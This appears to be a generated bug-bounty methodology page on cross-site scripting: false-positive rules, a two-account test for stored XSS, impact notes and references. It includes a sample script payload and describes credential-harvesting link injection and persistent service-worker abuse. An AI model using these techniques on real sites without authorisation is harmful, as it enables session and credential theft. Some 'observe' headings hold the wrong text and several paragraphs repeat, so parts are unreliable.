**To decide this case, observe: Why it looks vulnerable: the hunter has proven the source is attacker-controlled (location.hash, location.search, document.referrer, postMessage data, an API field) and has seen their marker echoed back in the DOM, so the taint half of the XSS chain is already established and the report feels 90% done.**

Derived from xss.fp_rule.sink_reachability.source_never_reaches_execution_sink, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xss.fp_rule.sink_reachability.source_never_reaches_execution_sink) states the full boundary.

**To decide this case, observe: Why it looks vulnerable: the markup injection is real - your marker sits unencoded in an HTML-executing context - so the defect is genuine even when nothing happens when the victim clicks.**

Derived from xss.fp_rule.csp.live_nonce_or_hash_policy_blocks_payload, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xss.fp_rule.csp.live_nonce_or_hash_policy_blocks_payload) states the full boundary.

**To decide this case, observe: Why it looks vulnerable: you POST {"name":"<script>alert(1)</script>"} to /api/profile and the string comes back verbatim in the response body - a clean taint-to-reflection path with a classic payload.**

Derived from xss.fp_rule.json_api.content_type_json_is_not_html_execution, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xss.fp_rule.json_api.content_type_json_is_not_html_execution) states the full boundary.

**To decide this case, observe: Why it looks vulnerable: your unique probe string comes back in the response body at the exact location you expected, so 'the input is reflected' is satisfied and the report writes itself.**

Derived from xss.fp_rule.html_encoding.entity_encoded_reflection_cannot_break_context, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xss.fp_rule.html_encoding.entity_encoded_reflection_cannot_break_context) states the full boundary.

**To decide this case, observe: If the sanitizer stripped the element, event handler or javascript: URL, the surviving characters are inserted as TEXT - the marker is visible in the rendered output as literal characters, no element with a live handler exists, no beacon fires and no console error appears from your payload.**

Derived from xss.fp_rule.sanitizer.output_observed_inert_in_page, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xss.fp_rule.sanitizer.output_observed_inert_in_page) states the full boundary.

**To decide this case, observe: Why it looks vulnerable: you POST a payload to a comment field or a profile name, it comes back in the response to YOUR own request with a 200, and the marker persists when you reload - so persistence plus reflection looks like stored XSS and a CVSS vector is already chosen.**

Derived from xss.fp_rule.stored_xss.entry_point_never_reaches_second_user_view, which states the false-positive boundary for this class. The observable above is what separates a real finding from the pattern that only looks like one. A hunter who cannot produce this observation in a request/response pair does not have a finding yet.

*Disproof:* This test does not apply where the surrounding behaviour is unobservable -- for example when the response is identical in every case, or when the only evidence is server-side and not reflected to the requester. The originating rule (xss.fp_rule.stored_xss.entry_point_never_reaches_second_user_view) states the full boundary.

**Stored XSS is proven only by storing a payload as one identity and loading the exit point as a second identity, because your own session re-rendering your own input proves storage and reflection, never cross-user execution.**

PROCEDURE. (1) Enumerate ENTRY points: every query parameter and body field, the URL path, headers a browser sets, and out-of-band routes the app ingests (inbound email, webhooks, third-party feeds, file uploads). (2) Enumerate EXIT points: every HTTP response served to any user in any situation - listings, detail pages, search results, profile pages, admin/moderation queues, dashboards, notification emails, exports, PDFs. (3) Link them by storing a UNIQUE marker per entry point (marker1 for field A, marker2 for field B) and then walking every exit page looking for those markers. Do not test each permutation manually - submit a batch of distinct markers, then sweep the exits once. (4) For every hit, re-submit the marker with a harmless payload (not yet an XSS payload) and confirm it persists across a NEW request rather than being echoed back in the submitting response. That distinguishes stored from reflected. (5) When a link is found, submit a real payload for that entry point. (6) Open the exit point in a SECOND browser profile / incognito window logged in as a DIFFERENT user - a second low-privilege account for peer views, or a separate admin account for privileged views. SUCCESS = the payload executes in the second session at the exit point. FAILURE = the payload only ever renders in your own session; that is not a reportable finding.

*Disproof:* The procedure is wrong if you only ever test with one account and the app renders stored values differently per role - the marker may be HTML-encoded for the author and injected raw into an admin moderation queue, so your own view can look safe while the privileged view is exploitable. It is also wrong where stored data is overwritten before any second read (recent-searches lists, ephemeral carts); a marker found once is not proof of durable storage - re-read the exit point after an unrelated action to confirm it survives.

## Impact

**The same reflected XSS has materially higher impact on a page behind login than on an unauthenticated page, because the victim's session grants privileged in-origin actions.**

Score reflected XSS by what the victim's session can do, not by the payload. On an unauthenticated page the ceiling is whatever an anonymous session may reach. On a page behind login, document the concrete privileged actions the injected script can perform in-origin (read sensitive records, modify data, act as the victim) and note that a compromised privileged user escalates to full application control. Attach the authenticated-path proof, not just the anonymous one.

*Disproof:* The vulnerable endpoint is reachable and exploitable only while unauthenticated, and no authenticated page on the same origin reflects the same parameter.

**An XSS-installed service worker outlives the 24-hour window that makes the browser bypass its cache on update checks, so a remediation claim of 'fixed within a day' is not supported until a changed script has actually been fetched, installed and activated.**

An XSS-installed service worker outlives the 24-hour window that makes the browser bypass its cache on update checks, so a remediation claim of 'fixed within a day' is not supported until a changed script has actually been fetched, installed and activated.

HackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

*Disproof:* A malicious worker that stops intercepting requests within 24 hours of the site serving a changed script refutes the persistence claim.

**HTML injection in an unprivileged page is routinely rated low to medium, but injecting a link element pointing at an attacker-controlled domain escalates it into a redirect to a spoofed page that harvests credentials, or a bridge to a previously found cross-site scripting page to take cookies.**

HTML injection in an unprivileged page is routinely rated low to medium, but injecting a link element pointing at an attacker-controlled domain escalates it into a redirect to a spoofed page that harvests credentials, or a bridge to a previously found cross-site scripting page to take cookies.

HackTricks reference: html injection on password reset page (https://kathan19.gitbook.io/howtohunt/html-injection/html_injection_on_password_reset_page.md)

*Disproof:* If the injected markup is escaped or sanitized so neither a link element nor a redirect renders, the escalation path never materialises and the finding stays at HTML injection severity.

**HTML injection in an unprivileged page is routinely rated low to medium, but injecting a link element pointing at an attacker-controlled domain escalates it into a redirect to a spoofed page that harvests credentials, or a bridge to a previously found cross-site scripting page to take cookies.**

HTML injection in an unprivileged page is routinely rated low to medium, but injecting a link element pointing at an attacker-controlled domain escalates it into a redirect to a spoofed page that harvests credentials, or a bridge to a previously found cross-site scripting page to take cookies.

HackTricks reference: html injection on password reset page (https://kathan19.gitbook.io/howtohunt/html-injection/html_injection_on_password_reset_page.md)

*Disproof:* If the injected markup is escaped or sanitized so neither a link element nor a redirect renders, the escalation path never materialises and the finding stays at HTML injection severity.

**Serving the vulnerable page over HTTPS changes nothing about the attack, because same-origin script execution is scoped by origin, and https is part of the origin definition rather than a barrier to it.**

Step: confirm the scheme of the origin hosting the vulnerable page, then run the payload there unchanged. An origin is the scheme, host and port together, so a script executing on https://example.com is inside the https://example.com origin and can reach that origin's cookies, DOM and endpoints exactly as legitimate code does. Transport security protects the channel between client and server; it says nothing about whether the bytes the server returns contain attacker-controlled script. Observation that proves the claim: the identical marker and the identical same-origin action succeed on the HTTPS origin, with no downgrade, mixed-content or certificate step involved anywhere in the chain.

*Disproof:* If the payload only executes on a plaintext HTTP origin and the browser blocks it or the application serves different content over HTTPS, then the scheme does affect the finding and this claim does not hold for it.

## Related Bug Classes

Not yet researched.

## References

- **cheatsheetseries.owasp.org** (cheatsheet)
  - <https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>
- **cwe.mitre.org** (taxonomy)
  - <https://cwe.mitre.org/data/definitions/79.html>
- **developer.mozilla.org** (docs)
  - <https://developer.mozilla.org/en-US/docs/Web/API/Document/write>
  - <https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML>
  - <https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API>
  - <https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage>
- **guides.rubyonrails.org** (writeup)
  - <https://guides.rubyonrails.org/security.html>
- **html.spec.whatwg.org** (docs)
  - <https://html.spec.whatwg.org/multipage/parsing.html>
- **jorianwoltjer.com** (writeup)
  - <https://jorianwoltjer.com/blog/p/stories/finding-xss-on-shazzer>
- **kathan19.gitbook.io** (reference)
  - <https://kathan19.gitbook.io/howtohunt/html-injection/html_injection_on_password_reset_page.md>
  - <https://kathan19.gitbook.io/howtohunt/xss/post_message_xss.md>
- **oreobiscuit.gitbook.io** (reference)
  - <https://oreobiscuit.gitbook.io/introduction/bug-bounty-reports-and-articles/injections-html-xss-etc.md>
- **owasp.org** (taxonomy)
  - <https://owasp.org/www-community/attacks/xss/>
- **portswigger.net** (taxonomy)
  - <https://portswigger.net/web-security/cross-site-scripting>
  - <https://portswigger.net/web-security/cross-site-scripting/content-security-policy>
  - <https://portswigger.net/web-security/cross-site-scripting/contexts>
  - <https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection>
  - <https://portswigger.net/web-security/cross-site-scripting/dangling-markup>
  - <https://portswigger.net/web-security/cross-site-scripting/dom-based>
  - <https://portswigger.net/web-security/cross-site-scripting/exploiting>
  - <https://portswigger.net/web-security/cross-site-scripting/reflected>
  - <https://portswigger.net/web-security/cross-site-scripting/stored>
  - <https://portswigger.net/web-security/dom-based>
  - <https://portswigger.net/web-security/prototype-pollution>
- **raw.githubusercontent.com** (writeup)
  - <https://raw.githubusercontent.com/Esther7171/HackTheBox-Writeups-Walkthroughs/main/Write-ups/Academy/05.%20Web%20Exploitation/27.%20Cross-Site%20Scripting%20%28XSS%29/Cross-Site%20Scripting%20%28XSS%29.md>
  - <https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md>
  - <https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md>
  - <https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md>
  - <https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md>
- **sonarsource.com** (writeup)
  - <https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/>
- **vuejs.org** (writeup)
  - <https://vuejs.org/guide/best-practices/security.html>
- **w3.org** (writeup)
  - <https://www.w3.org/TR/CSP3/>
- **zaproxy.org** (docs)
  - <https://www.zaproxy.org/docs/alerts/200002-1/>
- **zere.es** (writeup)
  - <https://zere.es/posts/self-xss-account-takeover/>

Every item above is gated on >= 2 distinct publisher hosts (`wks/quality.py`, rule R1). Publisher diversity, not citation count, is what makes these corroborated.
